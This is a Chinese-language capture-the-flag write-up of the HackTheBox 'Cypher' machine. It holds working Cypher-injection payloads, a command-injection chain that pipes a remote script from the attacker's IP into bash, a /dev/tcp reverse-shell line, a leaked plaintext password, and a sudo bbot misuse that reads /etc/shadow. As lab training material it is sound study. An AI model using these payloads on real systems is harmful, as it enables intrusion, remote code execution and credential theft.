---
title: HackTheBox-Season7-Cypher
published: 2025-03-09 16:18:09
tags: [HackTheBox]
category: 靶机
draft: false
---

# Season7-Cypher

> https://app.hackthebox.com/machines/Cypher | `Linux · Medium`
> 

## 前期踩点

`10.10.11.57` 是靶机

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -min-rate 10000 -p- 10.10.11.57              
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:19 EST
Nmap scan report for 10.10.11.57
Host is up (0.13s latency).
Not shown: 65352 filtered tcp ports (no-response), 181 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.15 seconds
```

发现域名 `http://cypher.htb/` 添加到`hosts`文件

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sT -A -T4 -O -p 22,80 10.10.11.57               
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:20 EST
Nmap scan report for 10.10.11.57
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://cypher.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   502.38 ms 10.10.16.1
2   586.07 ms 10.10.11.57

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.03 seconds
```

扫描`UDP`端口

```bash
⚡ root@kali  ~/Desktop/test/cypher  nmap -sU -min-rate 10000 -p- cypher.htb 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-02 07:25 EST
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0
Nmap scan report for cypher.htb (10.10.11.57)
Host is up (4.6s latency).
Not shown: 65517 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
476/udp   closed tn-tl-fd1
5749/udp  closed unknown
16119/udp closed unknown
16380/udp closed unknown
16424/udp closed unknown
32237/udp closed unknown
33895/udp closed unknown
39619/udp closed unknown
40153/udp closed unknown
42240/udp closed unknown
42704/udp closed unknown
45096/udp closed unknown
53762/udp closed unknown
55811/udp closed unknown
56083/udp closed unknown
59387/udp closed unknown
60627/udp closed unknown
62347/udp closed unknown
```

扫描一下子域名

```bash
⚡ root@kali  ~/Desktop/test/cypher  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hc=302 -H 'Host:FUZZ.cypher.htb' -u http://cypher.htb                               

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cypher.htb/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                       
=====================================================================

Total time: 199.7973
Processed Requests: 4989
Filtered Requests: 4989
Requests/sec.: 24.97030
```

访问`HTTP`主页，这个动画效果将我的`Kali`击碎

![image.png](image%2027.png)

貌似在登录框存在`SQL`注入，使用`SQLMAP`和手动注入无果

![image.png](image%2028.png)

扫描目录

```bash
⚡ root@kali  ~/Desktop/test/cypher  dirsearch -u cypher.htb -x 403,404,429 -e php,zip,txt                                                                        
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, zip, txt | HTTP method: GET | Threads: 25 | Wordlist size: 10439

Output File: /root/Desktop/test/cypher/reports/_cypher.htb/_25-03-02_08-33-32.txt

Target: http://cypher.htb/

[08:33:32] Starting: 
[08:33:56] 200 -    5KB - /about
[08:34:17] 307 -    0B  - /api/  ->  http://cypher.htb/api/api
[08:34:17] 307 -    0B  - /api  ->  /api/docs
[08:34:42] 307 -    0B  - /demo  ->  /login
[08:34:42] 307 -    0B  - /demo/  ->  http://cypher.htb/api/demo
[08:35:10] 200 -    4KB - /login
[08:35:10] 200 -    4KB - /login.html
[08:35:49] 301 -  178B  - /testing  ->  http://cypher.htb/testing/
```

发现新目录`testing` ，访问下载了`jar`文件

![image.png](image%2029.png)

## 反编译 jar

将`jar`文件下载下来，使用`jd-gui`反编译

![image.png](image%2030.png)

在其中发现貌似可以命令执行地方

```bash
String[] command = { "/bin/sh", "-c", "curl -s -o /dev/null --connect-timeout 1 -w %{http_code} " + url };
```

丢到`GPT`里进行分析：

- 该 Java 代码是 Neo4j 自定义 APOC（Awesome Procedures on Cypher）扩展的一部分，提供 `custom.getUrlStatusCode` 过程。
- 该过程接收一个 URL，使用 `curl` 命令获取其 HTTP 状态码，并返回。
- **攻击示例执行效果**这会导致服务器泄露敏感文件 `/etc/passwd`。
    
    ```
    CALL custom.getUrlStatusCode("https://example.com; cat /etc/passwd")
    ```
    
    ```
    curl -s -o /dev/null --connect-timeout 1 -w %{http_code} https://example.com; cat /etc/passwd
    ```
    

## Cypher Injection

看到`neo4j`才发现上面的压根不是`SQL`注入 https://neo4j.com/docs/getting-started/cypher/

> Cypher is Neo4j’s declarative and GQL conformant query language. Available as open source via The openCypher project, Cypher is similar to SQL, but optimized for graphs. | Cypher 是 Neo4j 的声明式和符合 GQL 的查询语言。Cypher 可通过openCypher 项目以开源形式获得，它类似于 SQL，但针对图形进行了优化。
> 

尝试了使用`cyphermap`但是始终返回`Unable to find valid injection type...`

通过 ：https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection 可以了解到`Cypher`注入

随便输入点东西可以在错误中发现查询语句

```bash
{message: Variable `c` not defined (line 1, column 75 (offset: 74))
"MATCH (u:USER) -[:SECRET]-> (h:SHA1) WHERE u.name = 'admin' or 1=1 return c//' return h.value as hash"
                                                                           ^}
```

成功闭合

```bash
{"username":"admin' or 1=1 return h.value as hash//","password":"1" }
```

![image.png](image%2031.png)

带外测试

```bash
{"username":"admin'return h.value as hash UNION CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.16.34/' + label AS r RETURN r as hash//","password":"1" }
```

![image.png](image%2032.png)

然后可以通过`custom` 用来引用自定义的程序或函数，也就是上面带有命令执行的方法 https://neo4j.com/labs/apoc/4.1/cypher-execution/cypher-based-procedures-functions/

成功带外，但是无回显

```bash
{
	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;whoami\") YIELD statusCode AS a RETURN a;//",
	"password":"1" 
}
```

构造`payload`

1. 在kali创建带有反弹shell语句的文件shell.txt（让服务器访问）
    
    ```bash
    /bin/bash -c 'bash -i >& /dev/tcp/10.10.16.34/1234 0>&1'
    ```
    
2. 开启监听
    
    ```bash
    ⚡ root@kali  ~/Desktop/test/cypher  nc -lvnp 1234
    listening on [any] 1234 ...
    ```
    
3. 开启简易服务器
4. 构造`payload`
    
    ```bash
    {
    	"username":"' return h.value as a UNION CALL custom.getUrlStatusCode(\"http://10.10.16.34;curl http://10.10.16.34/shell.txt|bash\") YIELD statusCode AS a RETURN a;//",
    	"password":"1" 
    }
    ```
    
    成功获得`shell`
    
    ![image.png](image%2033.png)
    

## 提权

信息收集一波

```bash
neo4j@cypher:/home/graphasm$ ls -al
total 56
drwxr-xr-x 9 graphasm graphasm 4096 Mar  2 13:01 .
drwxr-xr-x 3 root     root     4096 Oct  8 17:58 ..
lrwxrwxrwx 1 root     root        9 Oct  8 18:06 .bash_history -> /dev/null
-rw-r--r-- 1 graphasm graphasm  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 graphasm graphasm 3771 Mar 31  2024 .bashrc
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 11:35 .bbot
-rw-r--r-- 1 graphasm graphasm  156 Feb 14 12:35 bbot_preset.yml
drwx------ 3 graphasm graphasm 4096 Mar  2 11:35 .cache
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:18 .config
drwx------ 3 graphasm graphasm 4096 Mar  2 13:01 .gnupg
drwxrwxr-x 3 graphasm graphasm 4096 Mar  2 11:20 .local
-rw-r--r-- 1 graphasm graphasm  807 Mar 31  2024 .profile
drwx------ 2 graphasm graphasm 4096 Oct  8 17:58 .ssh
drwxrwxr-x 8 graphasm graphasm 4096 Mar  2 13:38 testoutput
-rw-r----- 1 root     graphasm   33 Mar  2 11:16 user.txt
```

bbot_preset.yml 得到一组账号密码

```bash
neo4j@cypher:/home/graphasm$ cat bbot_preset.yml
targets:
  - ecorp.htb

output_dir: /home/graphasm/bbot_scans

config:
  modules:
    neo4j:
      username: neo4j
      password: cU4btyib.20xtCMCXkBmerhK
```

但是使用`neo4j`登陆不成功，密码碰撞使用`graphasm`登陆成功

```bash
⚡ root@kali  ~/Desktop/test/cypher  ssh graphasm@10.10.11.57                            
graphasm@10.10.11.57's password: 
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-53-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Mar  2 03:13:58 PM UTC 2025

  System load:  0.0               Processes:             243
  Usage of /:   74.2% of 8.50GB   Users logged in:       1
  Memory usage: 66%               IPv4 address for eth0: 10.10.11.57
  Swap usage:   0%

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Sun Mar 2 15:13:59 2025 from 10.10.16.34
graphasm@cypher:~$ 
```

在家目录下可以读取`UserFlag`

```bash
graphasm@cypher:~$ cat user.txt 
63a155f3be93bac8eec086ec22459b65
```

查看graphasm用户权限

```bash
graphasm@cypher:~$ sudo -l
Matching Defaults entries for graphasm on cypher:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

查看`bbot`帮助

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot   
  ______  _____   ____ _______               
 |  ___ \|  __ \ / __ \__   __|                                                                                                                                                                                    
 | |___) | |__) | |  | | | |                                                                             
 |  ___ <|  __ <| |  | | | |                  
 | |___) | |__) | |__| | | |                                                                             
 |______/|_____/ \____/  |_|                                                                             
 BIGHUGE BLS OSINT TOOL v2.1.0.4939rc                                                                    
                                                                                                         
www.blacklanternsecurity.com/bbot                                                                        
                                                                                                         
usage: bbot [-h] [-t TARGET [TARGET ...]] [-w WHITELIST [WHITELIST ...]] [-b BLACKLIST [BLACKLIST ...]] [--strict-scope] [-p [PRESET ...]] [-c [CONFIG ...]] [-lp] [-m MODULE [MODULE ...]] [-l] [-lmo]
            [-em MODULE [MODULE ...]] [-f FLAG [FLAG ...]] [-lf] [-rf FLAG [FLAG ...]] [-ef FLAG [FLAG ...]] [--allow-deadly] [-n SCAN_NAME] [-v] [-d] [-s] [--force] [-y] [--dry-run] [--current-preset]
            [--current-preset-full] [-o DIR] [-om MODULE [MODULE ...]] [--json] [--brief] [--event-types EVENT_TYPES [EVENT_TYPES ...]]
            [--no-deps | --force-deps | --retry-deps | --ignore-failed-deps | --install-all-deps] [--version] [-H CUSTOM_HEADERS [CUSTOM_HEADERS ...]] [--custom-yara-rules CUSTOM_YARA_RULES]
                                                    
Bighuge BLS OSINT Tool                                                                                   
                                                                                                         
options:                                                                                                 
  -h, --help            show this help message and exit
                                                                                                         
Target:                
  -t TARGET [TARGET ...], --targets TARGET [TARGET ...]                             
                        Targets to seed the scan
  -w WHITELIST [WHITELIST ...], --whitelist WHITELIST [WHITELIST ...]
                        What's considered in-scope (by default it's the same as --targets)
  -b BLACKLIST [BLACKLIST ...], --blacklist BLACKLIST [BLACKLIST ...]
                        Don't touch these things                                                         
  --strict-scope        Don't consider subdomains of target/whitelist to be in-scope                                                                                                                               
                                                                                                         
Presets:                                           
  -p [PRESET ...], --preset [PRESET ...]                                                                 
                        Enable BBOT preset(s)                                                            
  -c [CONFIG ...], --config [CONFIG ...]                                                                                                                                                                           
                        Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'    
  -lp, --list-presets   List available presets.     
                                                                                                         
Modules:                                                                                                 
  -m MODULE [MODULE ...], --modules MODULE [MODULE ...]                                                  
                        Modules to enable. Choices: dnsbrute,paramminer_headers,github_org,ipneighbor,chaos,securitytxt,viewdns,baddns,ip2location,wpscan,bypass403,generic_ssrf,certspotter,urlscan,badsecrets,cre
dshed,dastardly,asn,postman_download,virustotal,columbus,ntlm,c99,internetdb,httpx,git_clone,trufflehog,bucket_file_enum,subdomaincenter,filedownload,github_workflows,code_repository,trickest,fingerprintx,newsle
tters,ffuf,anubisdb,crt,bucket_firebase,nuclei,portscan,unstructured,bucket_amazon,pgp,ffuf_shortnames,paramminer_cookies,azure_tenant,censys,dnscommonsrv,zoomeye,securitytrails,bucket_digitalocean,azure_realm,i
is_shortnames,bucket_azure,binaryedge,dnscaa,wayback,affiliates,url_manipulation,gowitness,otx,docker_pull,github_codesearch,telerik,gitlab,secretsdb,dnsbrute_mutations,myssl,emailformat,digitorus,paramminer_get
params,bevigil,fullhunt,vhost,oauth,hunt,dnsdumpster,passivetotal,baddns_zone,host_header,sitedossier,shodan_dns,bucket_google,social,wappalyzer,wafw00f,leakix,hackertarget,rapiddns,sslcert,git,robots,dotnetnuke
,skymem,baddns_direct,smuggler,builtwith,ipstack,postman,dehashed,hunterio,ajaxpro,dockerhub             
  -l, --list-modules    List available modules.                                                                                                                                                                    
  -lmo, --list-module-options                                                                            
                        Show all module config options        
  -em MODULE [MODULE ...], --exclude-modules MODULE [MODULE ...]                                         
                        Exclude these modules.
  -f FLAG [FLAG ...], --flags FLAG [FLAG ...]
                        Enable modules by flag. Choices: iis-shortnames,social-enum,service-enum,portscan,web-screenshots,slow,subdomain-enum,affiliates,web-thorough,safe,cloud-enum,web-paramminer,active,baddns,
deadly,aggressive,code-enum,subdomain-hijack,passive,web-basic,report,email-enum                         
  -lf, --list-flags     List available flags. 
  -rf FLAG [FLAG ...], --require-flags FLAG [FLAG ...]                                                   
                        Only enable modules with these flags (e.g. -rf passive)                          
  -ef FLAG [FLAG ...], --exclude-flags FLAG [FLAG ...]                                                   
                        Disable modules with these flags. (e.g. -ef aggressive)                          
  --allow-deadly        Enable the use of highly aggressive modules                                      
                                                                                                         
Scan:                                                                                                                                                                                                              
  -n SCAN_NAME, --name SCAN_NAME                                                                                                                                                                                   
                        Name of scan (default: random)                                                                                                                                                             
  -v, --verbose         Be more verbose                                                                                                                                                                            
  -d, --debug           Enable debugging            
  -s, --silent          Be quiet                                                                         
  --force               Run scan even in the case of condition violations or failed module setups        
  -y, --yes             Skip scan confirmation prompt                                                    
  --dry-run             Abort before executing scan                                                      
  --current-preset      Show the current preset in YAML format                                           
  --current-preset-full
                        Show the current preset in its full form, including defaults
                                                    
Output:                                                                                                  
  -o DIR, --output-dir DIR                                                                               
                        Directory to output scan results             
  -om MODULE [MODULE ...], --output-modules MODULE [MODULE ...]                                          
                        Output module(s). Choices: csv,discord,splunk,websocket,subdomains,txt,teams,emails,http,neo4j,asset_inventory,stdout,web_report,python,slack,json                                         
  --json, -j            Output scan data in JSON format   
  --event-types EVENT_TYPES [EVENT_TYPES ...]                                                            
                        Choose which event types to display                                              
                                                                                                                                                                                                                   
Module dependencies:                                                                                     
  Control how modules install their dependencies    
                                                                                                         
  --no-deps             Don't install module dependencies                                                
  --force-deps          Force install all module dependencies                                            
  --retry-deps          Try again to install failed module dependencies                                                                                                                                            
  --ignore-failed-deps  Run modules even if they have failed dependencies                                                                                                                                          
  --install-all-deps    Install dependencies for all modules                                                                                                                                                       
                                                                                                                                                                                                                   
Misc:                                                                                                                                                                                                              
  --version             show BBOT version and exit                                                       
  -H CUSTOM_HEADERS [CUSTOM_HEADERS ...], --custom-headers CUSTOM_HEADERS [CUSTOM_HEADERS ...]                                                                                                                     
                        List of custom headers as key value pairs (header=value).                        
  --custom-yara-rules CUSTOM_YARA_RULES, -cy CUSTOM_YARA_RULES
                        Add custom yara rules to excavate                                                
                                                    
EXAMPLES                                     
                                                                                                                                                                                                                   
    Subdomains:                                                                                          
        bbot -t evilcorp.com -p subdomain-enum
                                                                                                         
    Subdomains (passive only):                                                                           
        bbot -t evilcorp.com -p subdomain-enum -rf passive                                               
                                                                                                         
    Subdomains + port scan + web screenshots:                                                            
        bbot -t evilcorp.com -p subdomain-enum -m portscan gowitness -n my_scan -o .                     
                                                                                                                                                                                                                   
    Subdomains + basic web scan:                                                                                                                                                                                   
        bbot -t evilcorp.com -p subdomain-enum web-basic                                                                                                                                                           
                                                                                                                                                                                                                   
    Web spider:                                     
        bbot -t www.evilcorp.com -p spider -c web.spider_distance=2 web.spider_depth=2                   
                                                                                                         
    Everything everywhere all at once:                                                                   
        bbot -t evilcorp.com -p kitchen-sink                                                             
                                                                                                         
    List modules:      
        bbot -l                                                                                          
                                                    
    List presets:                                                                                        
        bbot -lp                                                                                         
                                                                                                         
    List flags:                                                                                          
        bbot -lf                                                                                        
```

构造任意文件读取

读取文件大点的文件，容易看见输出

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /etc/shadow -d 
```

![image.png](image%2034.png)

读取`root.txt`

```bash
graphasm@cypher:~$ sudo /usr/local/bin/bbot -cy /root/root.txt -d 
```

```bash
63582a9da70699c87d6bd78e92aa9a71
```

![image.png](image%2035.png)